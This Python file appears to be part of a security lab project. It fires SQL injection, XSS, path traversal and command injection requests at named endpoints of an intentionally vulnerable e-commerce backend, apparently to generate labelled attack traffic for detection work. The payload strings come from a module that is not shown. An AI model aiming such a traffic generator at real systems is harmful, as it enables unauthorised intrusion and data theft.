"""
Known Attack Traffic Generator

Fires targeted attack payloads at the victim e-commerce endpoints
through the API Gateway. Each attack type maps to a specific
vulnerability built into Member 3's backend.

Attack types:
  1. SQL Injection  → /api/login, /api/products/{id}, /api/search, /api/orders/{id}
  2. XSS (Stored)   → /api/products/{id}/reviews
  3. XSS (Reflected) → /api/search?q=
  4. Path Traversal → /api/download?file=
  5. Command Injection → /api/ping
"""

import random

import httpx

from payloads import (
    SQLI_LOGIN_PAYLOADS,
    SQLI_PRODUCT_ID_PAYLOADS,
    SQLI_SEARCH_PAYLOADS,
    SQLI_ORDER_ID_PAYLOADS,
    XSS_REVIEW_PAYLOADS,
    XSS_SEARCH_PAYLOADS,
    PATH_TRAVERSAL_PAYLOADS,
    COMMAND_INJECTION_PAYLOADS,
)


class AttackTrafficGenerator:
    """Generates known-attack traffic targeting specific vulnerabilities."""

    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")

    # ═══════════════════════════════════════════════════════
    # SQL INJECTION
    # ═══════════════════════════════════════════════════════

    async def sqli_login(self, client: httpx.AsyncClient) -> dict:
        """SQL Injection on POST /api/login."""
        payload = random.choice(SQLI_LOGIN_PAYLOADS)
        resp = await client.post(
            f"{self.base_url}/api/login",
            json=payload,
        )
        return {
            "action": "sqli_login",
            "attack_type": "SQL Injection",
            "method": "POST",
            "path": "/api/login",
            "status": resp.status_code,
            "payload": payload["username"],
            "detail": f"SQLi login bypass: {payload['username'][:50]}",
        }

    async def sqli_product(self, client: httpx.AsyncClient) -> dict:
        """SQL Injection on GET /api/products/{id}."""
        payload = random.choice(SQLI_PRODUCT_ID_PAYLOADS)
        resp = await client.get(f"{self.base_url}/api/products/{payload}")
        return {
            "action": "sqli_product",
            "attack_type": "SQL Injection",
            "method": "GET",
            "path": f"/api/products/{payload[:40]}",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"SQLi product exfiltration: {payload[:50]}",
        }

    async def sqli_search(self, client: httpx.AsyncClient) -> dict:
        """SQL Injection on GET /api/search?q=."""
        payload = random.choice(SQLI_SEARCH_PAYLOADS)
        resp = await client.get(
            f"{self.base_url}/api/search",
            params={"q": payload},
        )
        return {
            "action": "sqli_search",
            "attack_type": "SQL Injection",
            "method": "GET",
            "path": f"/api/search?q={payload[:30]}",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"SQLi search: {payload[:50]}",
        }

    async def sqli_order(self, client: httpx.AsyncClient) -> dict:
        """SQL Injection on GET /api/orders/{id}."""
        payload = random.choice(SQLI_ORDER_ID_PAYLOADS)
        resp = await client.get(f"{self.base_url}/api/orders/{payload}")
        return {
            "action": "sqli_order",
            "attack_type": "SQL Injection",
            "method": "GET",
            "path": f"/api/orders/{payload[:30]}",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"SQLi order BOLA: {payload[:50]}",
        }

    # ═══════════════════════════════════════════════════════
    # CROSS-SITE SCRIPTING (XSS)
    # ═══════════════════════════════════════════════════════

    async def xss_review(self, client: httpx.AsyncClient) -> dict:
        """Stored XSS on POST /api/products/{id}/reviews."""
        product_id = random.randint(1, 12)
        payload = random.choice(XSS_REVIEW_PAYLOADS)
        resp = await client.post(
            f"{self.base_url}/api/products/{product_id}/reviews",
            json={"rating": 5, "comment": payload},
        )
        return {
            "action": "xss_review",
            "attack_type": "XSS (Stored)",
            "method": "POST",
            "path": f"/api/products/{product_id}/reviews",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"Stored XSS in review: {payload[:50]}",
        }

    async def xss_search(self, client: httpx.AsyncClient) -> dict:
        """Reflected XSS on GET /api/search?q=."""
        payload = random.choice(XSS_SEARCH_PAYLOADS)
        resp = await client.get(
            f"{self.base_url}/api/search",
            params={"q": payload},
        )
        return {
            "action": "xss_search",
            "attack_type": "XSS (Reflected)",
            "method": "GET",
            "path": f"/api/search?q={payload[:30]}",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"Reflected XSS search: {payload[:50]}",
        }

    # ═══════════════════════════════════════════════════════
    # PATH TRAVERSAL
    # ═══════════════════════════════════════════════════════

    async def path_traversal(self, client: httpx.AsyncClient) -> dict:
        """Path Traversal on GET /api/download?file=."""
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        resp = await client.get(
            f"{self.base_url}/api/download",
            params={"file": payload},
        )
        return {
            "action": "path_traversal",
            "attack_type": "Path Traversal",
            "method": "GET",
            "path": f"/api/download?file={payload[:30]}",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"Path traversal: {payload}",
        }

    # ═══════════════════════════════════════════════════════
    # COMMAND INJECTION
    # ═══════════════════════════════════════════════════════

    async def command_injection(self, client: httpx.AsyncClient) -> dict:
        """Command Injection on POST /api/ping."""
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
        resp = await client.post(
            f"{self.base_url}/api/ping",
            json={"host": payload},
        )
        return {
            "action": "command_injection",
            "attack_type": "Command Injection",
            "method": "POST",
            "path": "/api/ping",
            "status": resp.status_code,
            "payload": payload,
            "detail": f"Cmd injection: {payload[:50]}",
        }

    # ═══════════════════════════════════════════════════════
    # RANDOM ATTACK SELECTOR
    # ═══════════════════════════════════════════════════════

    async def generate_one(self, client: httpx.AsyncClient) -> dict:
        """
        Generate a single random attack request.

        Weighted distribution across attack types:
          - 25% SQL Injection (login)
          - 10% SQL Injection (product)
          - 10% SQL Injection (search)
          - 5%  SQL Injection (order)
          - 15% XSS (stored review)
          - 10% XSS (reflected search)
          - 15% Path Traversal
          - 10% Command Injection
        """
        attacks = [
            (self.sqli_login, 25),
            (self.sqli_product, 10),
            (self.sqli_search, 10),
            (self.sqli_order, 5),
            (self.xss_review, 15),
            (self.xss_search, 10),
            (self.path_traversal, 15),
            (self.command_injection, 10),
        ]
        funcs, weights = zip(*attacks)
        chosen = random.choices(funcs, weights=weights, k=1)[0]

        try:
            return await chosen(client)
        except Exception as exc:
            return {
                "action": chosen.__name__,
                "attack_type": "Unknown",
                "method": "?",
                "path": "?",
                "status": 0,
                "payload": "",
                "detail": f"Error: {exc}",
            }
